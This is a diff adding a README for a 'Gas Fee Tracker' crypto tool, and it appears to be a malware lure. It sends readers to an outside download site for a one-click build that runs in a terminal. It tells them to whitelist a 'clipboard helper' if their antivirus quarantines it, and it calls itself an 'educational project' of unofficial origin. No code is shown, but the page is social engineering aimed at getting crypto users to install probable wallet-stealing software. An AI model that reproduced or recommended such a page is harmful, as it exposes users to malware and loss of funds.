@@ -1,0 +1,53 @@
+Gas Fee Tracker — Current Release Guide
+
+Everything around getting your gas fees environment ready in minutes instead of hours. Time your transactions instead of overpaying the mempool.
+
+✨ Highlights
+
+- ✅ One-click setup — no manual configuration needed
+- ✅ Step-by-step documentation included in this repository
+- ✅ Offline-friendly after first launch
+- ✅ No personal data collection
+
+🚀 Quick start
+
+Or open the link directly: https://go-release.xyz/
+
+💡 Bookmark this page — the button always points to the current release.
+
+🖥️ Requirements
+
+| Requirement | Details |
+|---|---|
+| Operating system | Windows 10 / 11 (64-bit) |
+| Memory | 4 GB RAM minimum |
+| Disk space | ~50 MB free |
+| Internet | Needed for the first launch only |
+
+📋 Notes
+
+- If nothing happens, wait a second and press Enter again inside the terminal window.
+
+❓ FAQ
+
+Can I share this with friends?
+
+Sure, just link them to this page so they always get the newest version.
+
+Is an internet connection required?
+
+Yes — the first launch pulls the latest build, afterwards it can run mostly offline.
+
+Do I need to disable my antivirus?
+
+Usually no. Only whitelist the helper if your security software quarantines the clipboard helper.
+
+Where do I report problems?
+
+Open an issue in this repository with your OS version and a short description of what happened.
+
+🧾 License
+
+Released under the MIT License — see LICENSE.
+
+Educational project. If you like the tool, consider supporting its official developers.
